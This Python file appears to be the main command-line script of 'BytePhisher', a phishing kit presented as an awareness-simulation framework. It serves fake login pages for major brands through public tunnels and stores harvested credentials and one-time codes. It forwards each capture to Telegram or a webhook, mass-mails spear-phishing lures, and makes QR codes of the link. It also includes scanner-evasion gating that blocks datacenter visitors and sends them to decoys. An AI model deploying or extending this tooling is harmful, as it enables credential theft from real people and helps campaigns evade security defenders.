#!/usr/bin/env python3
"""
BytePhisher v1.0 — advanced phishing-simulation framework (security-awareness /
authorized red-team use).

Pure-Python: no PHP. 80 templates, 6 concurrent tunnels, SQLite capture store,
live TUI + optional web dashboard, SMTP spear-phishing module.

Usage:
    python3 bytephisher.py --list
    python3 bytephisher.py -o 3 -t cloudflared
    python3 bytephisher.py -o google -t all --otp --redirect https://example.com
    python3 bytephisher.py --tunnels --port 8080 --web-dashboard
    python3 bytephisher.py --export out.csv

Flags mirror (and extend) PyPhisher/ZPhisher/BlackEye conventions:
    -o  template index (1..80) or slug (google, instagram, ...)
    -t  tunneler: cloudflared | ngrok | localhost_run | serveo | bore | hoplink | all | none
    -u  redirect URL after capture
    -p  local port (default 8080)
    -m  mode: normal | test   (test = no tunnels, local only)
"""
import argparse
import os
import sys
import time
import signal

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from core import server as srv
from core import capture as cap
from core import templates as tpl
from tunnels import REGISTRY as TUNNEL_REGISTRY, run_one, run_all

VERSION = "1.0"
TEMPLATES_DIR = os.path.join(HERE, "templates")
DEFAULT_DB = os.path.join(HERE, "data", "bytephisher.db")
CONFIG_PATH = os.path.join(HERE, "config", "config.yaml")


# ---------------------------------------------------------------- config ----
def load_config():
    cfg = {
        "port": 8080, "db_path": DEFAULT_DB, "geo_provider": "ipapi",
        "redirect_url": "", "tunneler_default": "cloudflared", "otp_default": False,
    }
    try:
        import yaml
        if os.path.isfile(CONFIG_PATH):
            with open(CONFIG_PATH, encoding="utf-8") as f:
                cfg.update(yaml.safe_load(f) or {})
    except Exception as e:
        print(f"[bytephisher] config load skipped: {e}")
    if not os.path.isabs(cfg.get("db_path", "")):
        cfg["db_path"] = os.path.join(HERE, cfg["db_path"])
    return cfg


# ------------------------------------------------------------- templates ----
def load_manifest():
    import json
    man_path = os.path.join(TEMPLATES_DIR, "templates.json")
    if not os.path.isfile(man_path):
        print("[bytephisher] templates not generated yet — running generator ...")
        sys.path.insert(0, os.path.join(HERE, "tools"))
        from gen_templates import main as gen_main
        gen_main()
    with open(man_path, encoding="utf-8") as f:
        return json.load(f)


def resolve_template(man, option):
    """Accepts index ('3'), slug ('google'), or None (menu)."""
    if option is None:
        print_templates(man)
        try:
            option = input("Select template [1-80] > ").strip()
        except EOFError:
            sys.exit(2)
    if str(option).isdigit():
        idx = int(option)
        for t in man:
            if t["index"] == idx:
                return t
        raise SystemExit(f"[bytephisher] no template with index {idx}")
    s = str(option).lower().strip()
    for t in man:
        if t["slug"] == s or s in t["dir"].lower():
            return t
    raise SystemExit(f"[bytephisher] no template matching '{option}'")


def print_templates(man):
    print(f"\n  BytePhisher templates ({len(man)}):")
    for t in man:
        print(f'   {t["index"]:>3}. {t["name"]:<22} [{t["slug"]}]')
    print()


# -------------------------------------------------------------- banners -----
BANNER = r"""
  ____        _         ____  _     _     _
 | __ ) _   _| |_ ___  |  _ \| |__ (_)___| |__   ___ _ __
 |  _ \| | | | __/ _ \ | |_) | '_ \| / __| '_ \ / _ \ '__|
 | |_) | |_| | ||  __/ |  __/| | | | \__ \ | | |  __/ |
 |____/ \__, |\__\___| |_|   |_| |_|_|___/_| |_|\___|_|
        |___/     v{ver}   pure-python | {count} templates | 6 tunnels
"""

def banner(count="?"):
    print(BANNER.format(ver=VERSION, count=count))


# ------------------------------------------------------------- main run -----
def main():
    # Line-buffered stdout: this CLI is routinely piped into files/logs, and a
    # block-buffered pipe means the operator sees nothing until the process
    # exits (cloudflared URLs, capture alerts, session summary all go missing).
    try:
        sys.stdout.reconfigure(line_buffering=True)
        sys.stderr.reconfigure(line_buffering=True)
    except Exception:
        pass

    ap = argparse.ArgumentParser(
        prog="bytephisher", add_help=True,
        description="BytePhisher — advanced phishing-simulation framework")
    ap.add_argument("-o", "--option", help="template index (1-80) or slug")
    ap.add_argument("-t", "--tunneler", default=None,
                    help="cloudflared|ngrok|localhost_run|serveo|bore|hoplink|all|none")
    ap.add_argument("-u", "--url", dest="redirect", default=None, help="redirect URL after capture")
    ap.add_argument("-p", "--port", type=int, default=None, help="local port (default 8080)")
    ap.add_argument("-m", "--mode", default="normal", choices=["normal", "test"],
                    help="normal = tunnels up; test = local only")
    ap.add_argument("--otp", action="store_true", help="serve OTP page after credential submit")
    ap.add_argument("--tls", action="store_true", help="serve HTTPS (needs --cert)")
    ap.add_argument("--cert", default=None, help="PEM cert (+key at same path with 'key' in name)")
    ap.add_argument("--geo", default=None, choices=["ipapi", "ipinfo", "off"], help="geo provider")
    ap.add_argument("--list", action="store_true", help="list templates and exit")
    ap.add_argument("--tunnels", action="store_true", help="list tunnelers and exit")
    ap.add_argument("--doctor", action="store_true",
                    help="check this machine can run a campaign (deps, templates, "
                         "tunnelers, DB) and exit")
    ap.add_argument("--web-dashboard", action="store_true", help="start Flask dashboard on :8090")
    ap.add_argument("--web-port", type=int, default=8090, help="web dashboard port")
    ap.add_argument("--export", metavar="PATH", help="export captures to CSV and exit")
    ap.add_argument("--no-tui", action="store_true", help="print captures, no live TUI")
    ap.add_argument("--telegram", metavar="TOKEN:CHAT_ID",
                    help="send every capture to a Telegram bot chat")
    ap.add_argument("--webhook", metavar="URL",
                    help="POST every capture as JSON to this URL (Discord/Slack/n8n)")
    ap.add_argument("--mailto", metavar="ADDR[,ADDR]",
                    help="after tunnels are up, email the phish link via SMTP")
    ap.add_argument("--mail-template", default="security_alert",
                    choices=["password_reset", "security_alert", "shared_doc", "invoice"],
                    help="which email template to use for --mailto")
    ap.add_argument("--mail-from-name", default="IT Support",
                    help="display name used inside the email template")
    ap.add_argument("--campaign", metavar="NAME",
                    help="tag this session's captures with a campaign name "
                         "(default: the template slug)")
    ap.add_argument("--qr", metavar="PATH", nargs="?", const="data/qr.png",
                    help="save a QR code PNG of the live link (default data/qr.png)")
    ap.add_argument("--report", metavar="PATH",
                    help="write a self-contained HTML campaign report and exit")
    ap.add_argument("--pdf", metavar="PATH",
                    help="write a dark-theme PDF campaign report (CONFIRMED/SUSPECTED "
                         "labels) and exit")
    ap.add_argument("--rotate", metavar="SLUGS",
                    help="serve a random one of these templates per request "
                         "(comma-separated slugs) — A/B style campaigns")
    # ---- campaign gating ----
    ap.add_argument("--allow-country", metavar="CC[,CC]",
                    help="only serve visitors from these ISO country codes (e.g. IN,US)")
    ap.add_argument("--block-country", metavar="CC[,CC]",
                    help="never serve visitors from these country codes")
    ap.add_argument("--block-datacenter", action="store_true",
                    help="refuse hosting/datacenter ASNs (kills most scanners)")
    ap.add_argument("--active-hours", metavar="H1-H2",
                    help="only serve between these local hours, e.g. 9-18")
    ap.add_argument("--active-days", metavar="DAYS",
                    help="only serve on these weekdays, e.g. mon-fri or mon,wed,fri")
    ap.add_argument("--max-hits", type=int, default=0, metavar="N",
                    help="refuse an IP after N hits per hour (0 = unlimited)")
    ap.add_argument("--decoy", metavar="URL",
                    help="where gated-out visitors go (default: inert 503 page)")
    ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
    args = ap.parse_args()

    cfg = load_config()
    db = cap.CaptureDB(args.export and cfg["db_path"] or cfg["db_path"])

    if args.export:
        # extension decides the format: .json -> JSON, anything else -> CSV
        if str(args.export).lower().endswith(".json"):
            path = db.export_json(args.export, campaign=args.campaign)
            print(f"[bytephisher] exported captures (json) -> {path}")
        else:
            path = db.export_csv(args.export, campaign=args.campaign)
            print(f"[bytephisher] exported captures (csv) -> {path}")
        print(f"[bytephisher] stats: {db.stats()}")
        return 0

    if args.report:
        from tools.report import build_report
        res = build_report(cfg["db_path"], args.report, campaign=args.campaign,
                           qr_url=args.qr and args.qr not in ("data/qr.png",) and args.qr or None)
        print(f"[bytephisher] report written -> {res['path']}")
        print(f"[bytephisher] rows: {res['rows']}  stats: {res['stats']}")
        return 0

    if args.pdf:
        try:
            from tools.report_pdf import build_report_pdf
        except ImportError as e:
            print(f"[bytephisher] PDF needs reportlab+pypdf ({e}). "
                  f"Install: ./.venv/bin/pip install reportlab pypdf")
            return 2
        res = build_report_pdf(cfg["db_path"], args.pdf, campaign=args.campaign,
                              qr_url=args.qr if args.qr and args.qr != "data/qr.png" else None)
        print(f"[bytephisher] pdf written -> {res['path']} ({res['pages']} pages, "
              f"{res['rows']} submissions, {res['stats']['credentials']} credential pairs)")
        return 0

    if args.tunnels:
        print("\n  Tunnelers:")
        for name in TUNNEL_REGISTRY:
            print(f"   - {name}")
        print("\n  Usage: -t cloudflared   |   -t all   |   -t none\n")
        return 0

    if args.doctor:
        from tools import doctor
        return doctor.main(argv=[])

    man = load_manifest()
    if args.list:
        print_templates(man)
        return 0

    banner(len(man))

    site = resolve_template(man, args.option)
    # --rotate: A/B style rotation over several templates, one per request
    rotate_dirs = None
    if args.rotate:
        rotate_dirs = []
        for slug in [s.strip() for s in args.rotate.split(",") if s.strip()]:
            rotate_dirs.append(resolve_template(man, slug)["dir"])
        if len(rotate_dirs) < 2:
            print("[bytephisher] --rotate needs at least two templates — ignoring")
            rotate_dirs = None
        else:
            print(f"[bytephisher] rotating  : {len(rotate_dirs)} templates per request")
    port = args.port or cfg.get("port", 8080)
    redirect = args.redirect if args.redirect is not None else cfg.get("redirect_url", "")
    geo = args.geo or cfg.get("geo_provider", "ipapi")
    tunneler = (args.tunneler or cfg.get("tunneler_default") or "none").lower()
    otp = args.otp or bool(cfg.get("otp_default"))

    print(f"[bytephisher] template : {site['name']}  ({site['dir']})")
    print(f"[bytephisher] port     : {port}")
    print(f"[bytephisher] geo      : {geo}")
    print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
    print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")

    # --- campaign gating (geo / time / rate) ---
    gate = None
    if any([args.allow_country, args.block_country, args.block_datacenter,
            args.active_hours, args.active_days, args.max_hits]):
        from core.gate import Gate
        gate = Gate(allow_countries=args.allow_country.split(",") if args.allow_country else None,
                    block_countries=args.block_country.split(",") if args.block_country else None,
                    block_datacenter=args.block_datacenter,
                    active_hours=args.active_hours, active_days=args.active_days,
                    max_hits_per_ip=args.max_hits)
        print(f"[bytephisher] gating    : {gate.describe()}")
        if gate.needs_geo and geo == "off":
            print("[bytephisher] WARNING   : country/datacenter gating with --geo off "
                  "blocks everyone (no geo data). Use --geo ipapi or ipinfo.")

    # --- capture notifier (Telegram / webhook) ---
    notifier = None
    telegram = args.telegram or cfg.get("telegram")
    webhook = args.webhook or cfg.get("webhook")
    tg_proxy = cfg.get("telegram_api_base")
    if tg_proxy:
        from core import alerts as _alerts
        _alerts.TELEGRAM_API_BASE = tg_proxy
    if telegram or webhook:
        from core.alerts import make_notifier
        notifier = make_notifier(telegram=telegram, webhook=webhook)
        print(f"[bytephisher] alerts   : telegram={'yes' if telegram else 'no'} "
              f"webhook={'yes' if webhook else 'no'}")

    httpd, _Handler = srv.serve(
        TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
        geo_provider=geo, redirect_url=redirect, otp=otp,
        tls=args.tls, cert_path=args.cert,
        on_capture=notifier, site_name=site["slug"],
        campaign=args.campaign or site["slug"],
        rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "")
    # serve_forever() must run in its own thread, otherwise the socket is bound
    # but never accepts connections while the CLI sits in the live-dashboard loop.
    import threading
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    print(f"[bytephisher] server up on 0.0.0.0:{port}")

    # --- web dashboard (optional) ---
    if args.web_dashboard:
        try:
            from dashboard import web_dashboard
            web_dashboard(port=args.web_port, db=db)
            print(f"[bytephisher] web dashboard: http://127.0.0.1:{args.web_port}")
        except Exception as e:
            print(f"[bytephisher] web dashboard failed: {e}")

    # --- tunnels ---
    urls = {}
    if args.mode != "test" and tunneler not in ("none", ""):
        print(f"[bytephisher] starting tunneler(s): {tunneler} ...")
        if tunneler == "all":
            urls = run_all(port)
        else:
            urls = {tunneler: run_one(tunneler, port)}
        print("\n[bytephisher] public URLs:")
        live = [u for u in urls.values() if u]
        for name, u in urls.items():
            print(f"   {name:<14} {u or 'FAILED'}")
        if not live:
            print("   (none live — falling back to local-only mode)")
        print()
    else:
        print(f"[bytephisher] local-only mode. Open: http://127.0.0.1:{port}\n")

    # --- QR code for the live link (posters, WhatsApp stickers, badges) ---
    if args.qr:
        from core import links
        link = live[0] if urls and live else f"http://127.0.0.1:{port}"
        png = links.qr_png(link, path=args.qr)
        if png:
            print(f"[bytephisher] QR code  : {png}  ->  {link}")
        else:
            print("[bytephisher] QR skipped: install segno (pip install segno)")

    # --- optional spear-phishing email blast with the live link ---
    if args.mailto:
        smtp = cfg.get("smtp") or {}
        link = live[0] if urls and live else f"http://127.0.0.1:{port}"
        if not smtp.get("host"):
            print("[bytephisher] --mailto given but config smtp.host is empty — skipping blast")
        else:
            from mailer import render, to_html, send_smtp
            ctx = {"Phish_URL": link, "From_Name": args.mail_from_name,
                   "Location": "unknown device", "Doc_Name": "Q3-payroll.xlsx",
                   "Invoice_ID": "INV-20431"}
            subject, body = render(args.mail_template, ctx)
            html = to_html(body, base=link, cta_label="Verify now")
            for addr in [a.strip() for a in args.mailto.split(",") if a.strip()]:
                ctx["To_Address"] = addr
                ctx["To_FirstName"] = addr.split("@")[0].split(".")[0].title()
                s2, b2 = render(args.mail_template, ctx)
                try:
                    send_smtp(smtp["host"], int(smtp.get("port", 587)), smtp.get("user", ""),
                              smtp.get("pass", ""), s2,
                              to_html(b2, base=link, cta_label="Verify now"),
                              addr, use_starttls=bool(smtp.get("use_starttls", True)), html=True)
                    print(f"[bytephisher] email sent -> {addr}")
                except Exception as e:
                    print(f"[bytephisher] email failed for {addr}: {type(e).__name__}: {e}")

    # --- live loop ---
    stop = {"flag": False}
    def _sig(_s, _f):
        stop["flag"] = True
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    t0 = time.time()
    warned_dead = set()

    def _tunnel_watchdog():
        """Warn loudly if a tunneler dies mid-campaign: the public URL it
        produced is dead, and a silent dead link wastes a whole campaign."""
        try:
            from tunnels import dead_names
            dead = set(dead_names())
        except Exception:
            return
        new = dead - warned_dead
        for name in sorted(new):
            warned_dead.add(name)
            print(f"\n[bytephisher] WARNING: tunneler '{name}' exited — "
                  f"its public URL is dead. Restart it or use another tunnel "
                  f"(e.g. -t all).\n", flush=True)

    try:
        if args.no_tui or not sys.stdout.isatty():
            from dashboard import render_plain
            last_check = time.time()
            while not stop["flag"]:
                print("\033[2J\033[H", end="")   # ANSI clear (no TERM dependency)
                render_plain(db.all(40), db.stats())
                print("\n[ctrl+c to stop]")
                if urls and time.time() - last_check > 10:
                    _tunnel_watchdog()
                    last_check = time.time()
                time.sleep(3)
        else:
            from dashboard import live_loop
            live_loop(db, stop, refresh=1.5, watchdog=_tunnel_watchdog if urls else None)
    except KeyboardInterrupt:
        pass
    finally:
        runtime = int(time.time() - t0)
        stats = db.stats()
        print("\n" + "=" * 62)
        print("  BYTEPHISHER SESSION SUMMARY")
        print("=" * 62)
        print(f"  runtime            : {runtime // 60}m {runtime % 60}s")
        print(f"  total captures     : {stats['total_captures']}")
        print(f"  credential captures: {stats['credentials']}")
        print(f"  credible (low risk): {stats.get('credible_credentials', 0)}")
        print(f"  unique visitors    : {stats['visitors']}")
        try:
            bs = db.blocked_stats()
            if bs["total_blocked"]:
                print(f"  gated out          : {bs['total_blocked']}")
        except Exception:
            pass
        if urls:
            print("  public urls:")
            for n, u in urls.items():
                if u:
                    print(f"    {n:<14} {u}")
        print("=" * 62)
        try:
            httpd.shutdown()
        except Exception:
            pass
        from tunnels import stop_all
        killed = stop_all()
        if killed:
            print(f"  tunnels stopped    : {killed}")
        try:
            db.close()
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
